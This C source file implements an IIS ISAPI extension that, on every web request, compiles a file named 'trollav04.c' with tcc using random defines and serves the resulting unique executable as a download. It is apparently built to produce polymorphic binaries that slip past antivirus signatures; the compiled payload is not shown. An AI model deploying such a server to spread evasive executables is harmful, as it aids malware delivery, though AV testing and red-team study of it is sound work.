// ISAPI code based on https://github.com/microsoft/Windows-classic-samples/blob/main/Samples/Win7Samples/web/iis/extensions/simple/Simple.cpp

#define _CRT_RAND_S
#include <Windows.h>
#include <tchar.h>
#include <HttpExt.h>
#include <strsafe.h>

#define MAXDBGLENGTH 2048
#define ISAPIDESCRITPION "GTISAPI"
#define VERMAJOR 1
#define VERMINOR 0

#define ISO_TIME_LEN 32
#define ISO_TIME_FORMAT  _T("%04i%02i%02iT%02i%02i%02i_%03i")

HANDLE hMutex;

PTSTR SystemTimeToISO8601_ms(SYSTEMTIME stTime)
{
	PTSTR pszISOTimeZ;
	pszISOTimeZ = LocalAlloc(LPTR, (ISO_TIME_LEN + 3) * sizeof(TCHAR));
	if (pszISOTimeZ)
	{
		StringCchPrintf(
			pszISOTimeZ,
			ISO_TIME_LEN + 3,
			ISO_TIME_FORMAT,
			stTime.wYear,
			stTime.wMonth,
			stTime.wDay,
			stTime.wHour,
			stTime.wMinute,
			stTime.wSecond,
			stTime.wMilliseconds);
	}
	return pszISOTimeZ;
}

PWSTR GetCurrentTimeZ(void)
{
	SYSTEMTIME stTime;
	GetSystemTime(&stTime);
	return (SystemTimeToISO8601_ms(stTime));
}

#define WORKINGDIRW L"C:\\workdir\\"

BOOL WINAPI GetExtensionVersion(_Out_ HSE_VERSION_INFO* pVer)
{
	TCHAR strMsg[MAXDBGLENGTH] = {0};
	_stprintf_s(strMsg, _countof(strMsg), TEXT("[GTISAPI] %hs() called."), __func__);
	OutputDebugString(strMsg);

	pVer->dwExtensionVersion = MAKELONG(VERMINOR, VERMAJOR);

	strcpy_s(pVer->lpszExtensionDesc, _countof(pVer->lpszExtensionDesc), ISAPIDESCRITPION);
	return TRUE;
}

BOOL Compile(PWSTR pwszOutputFullName)
{
	// it should be compiled via libtcc.dll and not via child processes. Maybe I will fix it some day.

	unsigned int iRand;
	TCHAR strMsg[MAXDBGLENGTH] = {0};
	_stprintf_s(strMsg, _countof(strMsg), TEXT("[GTISAPI] %hs() called."), __func__);
	OutputDebugString(strMsg);

	WaitForSingleObject(hMutex, INFINITE);
	WCHAR pwszCmdLine[2048] = {0}; //better safe than sorry

	rand_s(&iRand);
	// c:\temp\tcc\tcc.exe c:\temp\trollav04.c c:\temp\urlmon.def c:\temp\snmpapi.def -o c:\temp\output.exe -Dd1=\"d1\" -Dd5=\"d5\" -Drandomstring=\"abc123\"
	StringCchPrintfW(
		pwszCmdLine,
		_countof(pwszCmdLine),
		L"%stcc\\tcc.exe %strollav04.c %ssnmpapi.def %surlmon.def -o %s -Drandomstring=\\\"%u\\\"",
		WORKINGDIRW,
		WORKINGDIRW,
		WORKINGDIRW,
		WORKINGDIRW,
		pwszOutputFullName,
		iRand);

	rand_s(&iRand);
	if (iRand > (UINT_MAX / 2))
	{
		StringCchCatW(pwszCmdLine, _countof(pwszCmdLine), L" -Dd0=\\\"1\\\"");
	}

	rand_s(&iRand);
	if (iRand > (UINT_MAX / 2))
	{
		StringCchCatW(pwszCmdLine, _countof(pwszCmdLine), L" -Dd1=\\\"1\\\"");
	}

	rand_s(&iRand);
	if (iRand > (UINT_MAX / 2))
	{
		StringCchCatW(pwszCmdLine, _countof(pwszCmdLine), L" -Dd2=\\\"1\\\"");
	}

	rand_s(&iRand);
	if (iRand > (UINT_MAX / 2))
	{
		StringCchCatW(pwszCmdLine, _countof(pwszCmdLine), L" -Dd3=\\\"1\\\"");
	}

	rand_s(&iRand);
	if (iRand > (UINT_MAX / 2))
	{
		StringCchCatW(pwszCmdLine, _countof(pwszCmdLine), L" -Dd4=\\\"1\\\"");
	}

	rand_s(&iRand);
	if (iRand > (UINT_MAX / 2))
	{
		StringCchCatW(pwszCmdLine, _countof(pwszCmdLine), L" -Dd5=\\\"1\\\"");
	}

	rand_s(&iRand);
	if (iRand > (UINT_MAX / 2))
	{
		StringCchCatW(pwszCmdLine, _countof(pwszCmdLine), L" -Dd6=\\\"1\\\"");
	}

	rand_s(&iRand);
	if (iRand > (UINT_MAX / 2))
	{
		StringCchCatW(pwszCmdLine, _countof(pwszCmdLine), L" -Dd7=\\\"1\\\"");
	}

	rand_s(&iRand);
	if (iRand > (UINT_MAX / 2))
	{
		StringCchCatW(pwszCmdLine, _countof(pwszCmdLine), L" -Dd8=\\\"1\\\"");
	}

	rand_s(&iRand);
	if (iRand > (UINT_MAX / 2))
	{
		StringCchCatW(pwszCmdLine, _countof(pwszCmdLine), L" -Dd9=\\\"1\\\"");
	}

	rand_s(&iRand);
	if (iRand > (UINT_MAX / 2))
	{
		StringCchCatW(pwszCmdLine, _countof(pwszCmdLine), L" -Dda=\\\"1\\\"");
	}

	rand_s(&iRand);
	if (iRand > (UINT_MAX / 2))
	{
		StringCchCatW(pwszCmdLine, _countof(pwszCmdLine), L" -Ddb=\\\"1\\\"");
	}

	rand_s(&iRand);
	if (iRand > (UINT_MAX / 2))
	{
		StringCchCatW(pwszCmdLine, _countof(pwszCmdLine), L" -Ddc=\\\"1\\\"");
	}

	rand_s(&iRand);
	if (iRand > (UINT_MAX / 2))
	{
		StringCchCatW(pwszCmdLine, _countof(pwszCmdLine), L" -Ddd=\\\"1\\\"");
	}

	rand_s(&iRand);
	if (iRand > (UINT_MAX / 2))
	{
		StringCchCatW(pwszCmdLine, _countof(pwszCmdLine), L" -Dde=\\\"1\\\"");
	}

	rand_s(&iRand);
	if (iRand > (UINT_MAX / 2))
	{
		StringCchCatW(pwszCmdLine, _countof(pwszCmdLine), L" -Ddf=\\\"1\\\"");
	}

	rand_s(&iRand);
	if (iRand > (UINT_MAX / 2))
	{
		StringCchCatW(pwszCmdLine, _countof(pwszCmdLine), L" -m32");
	}

	_stprintf_s(strMsg, _countof(strMsg), TEXT("[GTISAPI] compilation cmdline: %ls"), pwszCmdLine);
	OutputDebugString(strMsg);

	_wsystem(pwszCmdLine);

	_stprintf_s(strMsg, _countof(strMsg), TEXT("[GTISAPI] compilation done."));
	OutputDebugString(strMsg);

	ReleaseMutex(hMutex);
	return TRUE;
}

DWORD WINAPI HttpExtensionProc(_In_ EXTENSION_CONTROL_BLOCK* pECB)
{
	TCHAR strMsg[MAXDBGLENGTH] = {0};
	_stprintf_s(strMsg, _countof(strMsg), TEXT("[GTISAPI] %hs() called."), __func__);
	OutputDebugString(strMsg);
	_stprintf_s(strMsg, _countof(strMsg), TEXT("[GTISAPI] pi: #%hs#"), pECB->lpszPathInfo);
	OutputDebugString(strMsg);
	_stprintf_s(strMsg, _countof(strMsg), TEXT("[GTISAPI] qs: #%hs#"), pECB->lpszQueryString);
	OutputDebugString(strMsg);


	_stprintf_s(strMsg, _countof(strMsg), TEXT("[GTISAPI] qs len: %d"), (DWORD)strlen(pECB->lpszQueryString));
	OutputDebugString(strMsg);

	_stprintf_s(strMsg, _countof(strMsg), TEXT("[GTISAPI] Compiling..."));
	OutputDebugString(strMsg);

	PWSTR pwszDestName;
	WCHAR pwszDestFullName[MAX_PATH];
	BOOL bRes;
	pwszDestName = GetCurrentTimeZ();

	StringCchPrintfW(pwszDestFullName, _countof(pwszDestFullName), L"%s%s.exe", WORKINGDIRW, pwszDestName);

	_stprintf_s(strMsg, _countof(strMsg), TEXT("[GTISAPI] Dest full name: %s"), pwszDestFullName);
	OutputDebugString(strMsg);

	Compile(pwszDestFullName);

	HANDLE hFile;
	DWORD dwFileSize;
	hFile = CreateFile(
		pwszDestFullName,
		GENERIC_READ,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);
	_stprintf_s(strMsg, _countof(strMsg), TEXT("[GTISAPI] CreateFile: %d"), GetLastError());
	OutputDebugString(strMsg);

	_stprintf_s(strMsg, _countof(strMsg), TEXT("[GTISAPI] Deleting exe..."));
	OutputDebugString(strMsg);


	if (INVALID_HANDLE_VALUE == hFile)
	{
		DeleteFileW(pwszDestFullName); //best effort
		LocalFree(pwszDestName);
		return HSE_STATUS_ERROR;
	}

	dwFileSize = GetFileSize(hFile, NULL);
	_stprintf_s(strMsg, _countof(strMsg), TEXT("[GTISAPI] FileSize: %d"), dwFileSize);
	OutputDebugString(strMsg);
	if (0 == dwFileSize || INVALID_FILE_SIZE == dwFileSize)
	{
		_stprintf_s(strMsg, _countof(strMsg), TEXT("[GTISAPI] FileSize Error: %d"), GetLastError());
		OutputDebugString(strMsg);
		CloseHandle(hFile);
		DeleteFileW(pwszDestFullName); //best effort
		LocalFree(pwszDestName);
		return HSE_STATUS_ERROR;
	}

	PBYTE pBuffer;
	pBuffer = LocalAlloc(LPTR, (size_t)dwFileSize);
	if (NULL == pBuffer)
	{
		_stprintf_s(strMsg, _countof(strMsg), TEXT("[GTISAPI] Error allocating buffer"));
		OutputDebugString(strMsg);
		CloseHandle(hFile);
		DeleteFileW(pwszDestFullName); //best effort
		LocalFree(pwszDestName);
		return HSE_STATUS_ERROR;
	}

	//for (DWORD i = 0; i < SPAREBYTES; i++)
	//{
	//	unsigned int iRand;
	//	rand_s(&iRand);
	//	pBuffer[dwFileSize + i] = (BYTE)iRand;
	//}

	DWORD dwRead;
	bRes = ReadFile(hFile, pBuffer, dwFileSize, &dwRead, NULL);
	if (!bRes)
	{
		_stprintf_s(strMsg, _countof(strMsg), TEXT("[GTISAPI] Error reading file: %d"), GetLastError());
		OutputDebugString(strMsg);
		LocalFree(pBuffer);
		CloseHandle(hFile);
		DeleteFileW(pwszDestFullName); //best effort
		LocalFree(pwszDestName);
		return HSE_STATUS_ERROR;
	}

	HSE_SEND_HEADER_EX_INFO HeaderExInfo;

	// prepare headers
	HeaderExInfo.pszStatus = "200 OK";
	HeaderExInfo.pszHeader = "Content-type: application/octet-stream\r\n\r\n";
	HeaderExInfo.cchStatus = (DWORD)strlen(HeaderExInfo.pszStatus);
	HeaderExInfo.cchHeader = (DWORD)strlen(HeaderExInfo.pszHeader);
	HeaderExInfo.fKeepConn = FALSE;

	// send headers using IIS-provided callback
	//
	// Note - if we needed to keep connection open, we would set fKeepConn 
	// to TRUE *and* we would need to provide correct Content-Length: header

	pECB->ServerSupportFunction(pECB->ConnID, HSE_REQ_SEND_RESPONSE_HEADER_EX, &HeaderExInfo, NULL, NULL);

	// Calculate length of string to output to client

	DWORD dwBytesToWrite = dwFileSize;

	// send text using IIS-provied callback

	pECB->WriteClient(pECB->ConnID, pBuffer, &dwBytesToWrite, 0); // HSE_IO_SYNC ????

	LocalFree(pBuffer);
	CloseHandle(hFile);
	DeleteFileW(pwszDestFullName); //best effort
	LocalFree(pwszDestName);

	// Indicate that the call to HttpExtensionProc was successful
	return HSE_STATUS_SUCCESS;
}


BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
	UNREFERENCED_PARAMETER(lpReserved);
	TCHAR strMsg[MAXDBGLENGTH] = {0};

	DisableThreadLibraryCalls(hModule);

	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		hMutex = CreateMutex(NULL, FALSE, NULL);
		_stprintf_s(strMsg, _countof(strMsg), TEXT("[GTISAPI] Attach."));
		OutputDebugString(strMsg);
		break;
	case DLL_PROCESS_DETACH:
		_stprintf_s(strMsg, _countof(strMsg), TEXT("[GTISAPI] Detach."));
		OutputDebugString(strMsg);
		break;
	default:
		break;
	}

	return TRUE;
}
